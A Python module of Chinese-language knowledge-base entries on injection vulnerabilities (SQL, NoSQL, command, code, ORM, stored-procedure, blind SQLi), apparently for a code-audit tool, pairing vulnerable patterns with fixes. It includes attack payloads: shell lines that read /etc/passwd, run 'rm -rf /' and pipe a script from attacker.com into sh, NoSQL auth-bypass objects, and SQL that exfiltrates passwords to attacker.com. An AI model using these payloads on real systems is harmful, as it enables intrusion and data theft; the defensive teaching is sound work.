"""
注入类漏洞知识
"""

from ..base import KnowledgeDocument, KnowledgeCategory


SQL_INJECTION = KnowledgeDocument(
    id="vuln_sql_injection",
    title="SQL Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["sql", "injection", "database", "input-validation", "sqli"],
    severity="critical",
    cwe_ids=["CWE-89"],
    owasp_ids=["A03:2021"],
    content="""
SQL注入是一种代码注入技术，攻击者通过在应用程序查询中插入恶意SQL代码来操纵数据库。

## 危险模式

### Python
```python
# 危险 - 字符串拼接
query = "SELECT * FROM users WHERE id = " + user_id
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")
query = "SELECT * FROM users WHERE id = %s" % user_id

# 危险 - ORM原始查询
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
db.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))
```

### JavaScript/Node.js
```javascript
// 危险
const query = `SELECT * FROM users WHERE id = ${userId}`;
connection.query("SELECT * FROM users WHERE name = '" + name + "'");
```

### Java
```java
// 危险
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = conn.createStatement();
stmt.executeQuery(query);
```

## 检测关键词
- execute, query, raw, cursor
- SELECT, INSERT, UPDATE, DELETE
- 字符串拼接 (+, f-string, format, %)
- WHERE, AND, OR 后跟变量

## 安全实践
1. 使用参数化查询/预编译语句
2. 使用ORM框架的安全API
3. 输入验证和类型检查
4. 最小权限原则
5. 使用存储过程

## 修复示例
```python
# 安全 - 参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 安全 - ORM
User.objects.filter(id=user_id)

# 安全 - SQLAlchemy
db.query(User).filter(User.id == user_id)
```

## 验证方法
1. 尝试单引号 ' 触发语法错误
2. 使用 OR 1=1 测试布尔注入
3. 使用 SLEEP() 测试时间盲注
4. 检查错误信息是否泄露数据库信息
""",
)


NOSQL_INJECTION = KnowledgeDocument(
    id="vuln_nosql_injection",
    title="NoSQL Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["nosql", "mongodb", "injection", "database"],
    severity="high",
    cwe_ids=["CWE-943"],
    owasp_ids=["A03:2021"],
    content="""
NoSQL注入针对MongoDB等NoSQL数据库，通过操纵查询对象来绕过认证或提取数据。

## 危险模式

### MongoDB (Python)
```python
# 危险 - 直接使用用户输入构建查询
db.users.find({"username": username, "password": password})
# 攻击者可传入 {"$ne": ""} 绕过认证

# 危险 - $where操作符
db.users.find({"$where": f"this.name == '{name}'"})
```

### MongoDB (Node.js)
```javascript
// 危险
db.collection('users').find({username: req.body.username});
// 攻击者可传入 {$gt: ""} 或 {$ne: null}
```

## 攻击载荷示例
```json
// 绕过认证
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 正则注入
{"username": {"$regex": "^admin"}}
```

## 安全实践
1. 验证输入类型（确保是字符串而非对象）
2. 使用白名单验证
3. 避免使用$where操作符
4. 使用mongoose等ODM的类型验证

## 修复示例
```python
# 安全 - 类型验证
if not isinstance(username, str):
    raise ValueError("Invalid username type")
db.users.find({"username": str(username)})
```
""",
)


COMMAND_INJECTION = KnowledgeDocument(
    id="vuln_command_injection",
    title="Command Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["command", "injection", "shell", "os", "system", "rce"],
    severity="critical",
    cwe_ids=["CWE-78"],
    owasp_ids=["A03:2021"],
    content="""
命令注入允许攻击者在主机操作系统上执行任意命令，可能导致完全系统控制。

## 危险模式

### Python
```python
# 危险
os.system("ping " + user_input)
os.popen("ls " + directory)
subprocess.call("ls " + directory, shell=True)
subprocess.Popen(cmd, shell=True)
commands.getoutput("cat " + filename)

# 危险 - eval/exec
eval(user_input)
exec(user_code)
```

### Node.js
```javascript
// 危险
exec("ls " + userInput);
execSync(`cat ${filename}`);
spawn("sh", ["-c", userCommand]);
```

### PHP
```php
// 危险
system("ping " . $ip);
exec("cat " . $file);
shell_exec($cmd);
passthru($command);
```

## 攻击载荷
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
&& rm -rf /
|| curl attacker.com/shell.sh | sh
```

## 安全实践
1. 避免使用shell=True
2. 使用参数列表而非字符串
3. 输入验证和白名单
4. 使用安全的替代API
5. 沙箱执行

## 修复示例
```python
# 安全 - 参数列表
subprocess.run(["ping", "-c", "4", validated_host], shell=False)

# 安全 - shlex转义
import shlex
subprocess.run(shlex.split(f"ping -c 4 {shlex.quote(host)}"))
```
""",
)


CODE_INJECTION = KnowledgeDocument(
    id="vuln_code_injection",
    title="Code Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["code", "injection", "eval", "exec", "rce"],
    severity="critical",
    cwe_ids=["CWE-94"],
    owasp_ids=["A03:2021"],
    content="""
代码注入允许攻击者注入并执行任意代码，通常通过eval()等动态执行函数。

## 危险模式

### Python
```python
# 危险
eval(user_input)
exec(user_code)
compile(user_code, '<string>', 'exec')

# 危险 - 模板注入
template = Template(user_input)
render_template_string(user_input)
```

### JavaScript
```javascript
// 危险
eval(userInput);
new Function(userCode)();
setTimeout(userCode, 1000);
setInterval(userCode, 1000);
```

### PHP
```php
// 危险
eval($code);
assert($code);
preg_replace('/e', $code, $input);  // PHP < 7
create_function('', $code);
```

## 安全实践
1. 永远不要eval用户输入
2. 使用AST解析代替eval
3. 使用沙箱环境
4. 白名单允许的操作

## 修复示例
```python
# 安全 - 使用ast.literal_eval处理数据
import ast
data = ast.literal_eval(user_input)  # 只允许字面量

# 安全 - 使用json解析
import json
data = json.loads(user_input)
```
""",
)


SECOND_ORDER_SQLI = KnowledgeDocument(
    id="vuln_second_order_sqli",
    title="Second-Order SQL Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["sqli", "second-order", "stored-injection", "delayed", "trigger"],
    severity="high",
    cwe_ids=["CWE-89", "CWE-564"],
    owasp_ids=["A03:2021"],
    content="""
# 二阶SQL注入（Second-Order SQL Injection）

## 概述

二阶SQL注入是指恶意输入在初次存储时不触发注入（数据被正确转义存储），
但在后续操作中被取出并拼接进SQL查询时触发注入。由于输入端看似安全，常被忽略。

## 漏洞模式

### 1. 存储后二次使用触发

```python
# 第一阶段 - 注册（安全存储）
username = sanitize_input(request.form['username'])
db.execute("INSERT INTO users (username) VALUES (?)", (username,))

# 第二阶段 - 取出后拼接触发注入
user = db.execute(f"SELECT id FROM users WHERE username = '{username}'").fetchone()
posts = db.execute(f"SELECT * FROM posts WHERE author_id = {user[0]}")
```

### 2. MyBatis 延迟绑定

```xml
<select id="getUser" parameterType="string" resultType="User">
    SELECT * FROM users WHERE ${sortColumn} ${sortOrder}
</select>
```

```python
prefs = get_user_sort_preference(request.user.id)
return db.query(f"SELECT * FROM users ORDER BY {prefs['sort_column']} {prefs['sort_direction']}")
```

### 3. 触发器动态SQL

```sql
CREATE TRIGGER update_audit_log AFTER UPDATE ON users
FOR EACH ROW BEGIN
    EXECUTE IMMEDIATE 'INSERT INTO audit_log(action) VALUES (''Updated '' || OLD.username || '')';
END;
```

## 发现技术

1. 跟踪数据从输入→存储→取出的完整链路
2. 检查存储过程、触发器内是否使用动态SQL
3. 关注管理后台/批处理等触发历史数据二次使用的功能

## 修复建议

```python
def get_user_profile(username):
    user = db.execute("SELECT id FROM users WHERE username = ?", (username,))
    posts = db.execute("SELECT * FROM posts WHERE author_id = ?", (user[0],))
```

## 严重性评估

- 可写入注入后门：Critical
- 管理后台触发：High
- 需特殊条件：Medium
""",
)


STORED_PROCEDURE_INJECTION = KnowledgeDocument(
    id="vuln_stored_procedure_injection",
    title="Stored Procedure Injection",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["sqli", "stored-procedure", "cursor", "dynamic-sql", "database"],
    severity="high",
    cwe_ids=["CWE-89", "CWE-564"],
    owasp_ids=["A03:2021"],
    content="""
# 存储过程注入

## 概述

存储过程内使用动态SQL拼接而非参数化查询时的注入风险。
即使应用程序层使用了参数化，存储过程内部的动态SQL仍可能引入注入。

## 漏洞模式

### SQL Server 动态SQL

```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50) AS
BEGIN
    DECLARE @sql NVARCHAR(MAX)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END

-- 安全
CREATE PROCEDURE GetUserSafe @username NVARCHAR(50) AS
BEGIN
    EXEC sp_executesql N'SELECT * FROM users WHERE username = @u',
        N'@u NVARCHAR(50)', @u = @username
END
```

### MySQL 动态SQL

```sql
CREATE PROCEDURE GetUser(IN uname VARCHAR(50))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE username = ''', uname, '''');
    PREPARE stmt FROM @sql; EXECUTE stmt;
END
```

### Oracle PL/SQL

```sql
CREATE OR REPLACE PROCEDURE get_user(p_username VARCHAR2) IS
BEGIN
    EXECUTE IMMEDIATE 'SELECT * FROM users WHERE username = ''' || p_username || '''';
END;

-- 安全
CREATE OR REPLACE PROCEDURE get_user(p_username VARCHAR2) IS
BEGIN
    EXECUTE IMMEDIATE 'SELECT * FROM users WHERE username = :1' USING p_username;
END;
```

## 发现技术

1. 查找 EXEC(@sql) / EXECUTE IMMEDIATE / PREPARE...EXECUTE
2. 检查存储过程参数直接拼接到SQL字符串

## 修复建议

使用绑定变量：sp_executesql (SQL Server)、USING (Oracle/Oracle MySQL)、参数化预处理
""",
)


ORM_INJECTION = KnowledgeDocument(
    id="vuln_orm_injection",
    title="ORM Injection (HQL/JPQL/SQLAlchemy/MyBatis/Prisma)",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["orm", "hql", "jpql", "mybatis", "sqlalchemy", "prisma", "injection"],
    severity="critical",
    cwe_ids=["CWE-89", "CWE-943", "CWE-564"],
    owasp_ids=["A03:2021"],
    content="""
# ORM 注入

## 概述

ORM框架使用不当（原生查询、拼接、特殊操作符）仍可导致注入。

## 漏洞模式

### Hibernate HQL/JPQL

```java
String hql = "FROM User WHERE name = '" + userName + "'";
Query query = session.createQuery(hql);

// 安全
Query query = session.createQuery("FROM User WHERE name = :name");
query.setParameter("name", userName);
```

### MyBatis ${}

```xml
<select id="search" resultType="User">
    SELECT * FROM users WHERE name LIKE '%${keyword}%' ORDER BY ${sortColumn}
</select>

<!-- 安全 -->
<select id="search" resultType="User">
    SELECT * FROM users WHERE name LIKE CONCAT('%', #{keyword}, '%')
</select>
```

### SQLAlchemy text()

```python
result = db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# 安全
result = db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
```

### Prisma $queryRawUnsafe

```typescript
const users = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`)

// 安全
const users = await prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`
```

### Entity Framework

```csharp
var users = db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{userName}'").ToList();

// 安全
var users = db.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Name = {userName}").ToList();
```

## 发现技术

1. 搜索危险API: HQL拼接、MyBatis ${}、SQLAlchemy text()拼接、Prisma $queryRawUnsafe、EF FromSqlRaw
2. 检查 ORDER BY / LIKE 子句传参方式
3. 审计动态列名/表名拼接场景

## 严重性评估

- 全拼接：Critical
- 仅排序/列名白名单缺失：High
- 仅IN/LIKE拼接：Medium
""",
)


BLIND_SQL_INJECTION = KnowledgeDocument(
    id="vuln_blind_sqli",
    title="Blind SQL Injection Techniques",
    category=KnowledgeCategory.VULNERABILITY,
    tags=["sqli", "blind", "time-based", "boolean", "oob", "error-based"],
    severity="high",
    cwe_ids=["CWE-89", "CWE-208"],
    owasp_ids=["A03:2021"],
    content="""
# 盲注技术（Blind SQL Injection）

## 概述

盲注发生在应用不直接返回数据库错误或查询结果时，通过应用行为差异（响应时间、
HTTP状态码、响应内容）推断数据库信息。

### Boolean-Based
```sql
AND 1=1 -- 正常
AND 1=2 -- 异常
AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'
```

### Time-Based
```sql
-- MySQL
AND SLEEP(5)
-- PostgreSQL
AND (SELECT PG_SLEEP(5))
-- SQL Server
AND WAITFOR DELAY '0:0:5'
-- Oracle
AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5)
```

### Error-Based
```sql
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))
```

### OOB (Out-of-Band)
```sql
AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\test'))
AND EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT TOP 1 password FROM users)
```

### NoSQL 盲注
```javascript
db.users.find({$where: "sleep(5000) || this.username == 'admin'"})
db.users.find({username: {$gt: "m"}})
```

## 严重性评估

- OOB外带：Critical
- 时间盲注提取数据：High
- 布尔盲注速度慢：Medium
""",
)


__all__ = [
    "SQL_INJECTION", "NOSQL_INJECTION", "COMMAND_INJECTION", "CODE_INJECTION",
    "SECOND_ORDER_SQLI", "STORED_PROCEDURE_INJECTION", "ORM_INJECTION", "BLIND_SQL_INJECTION",
]
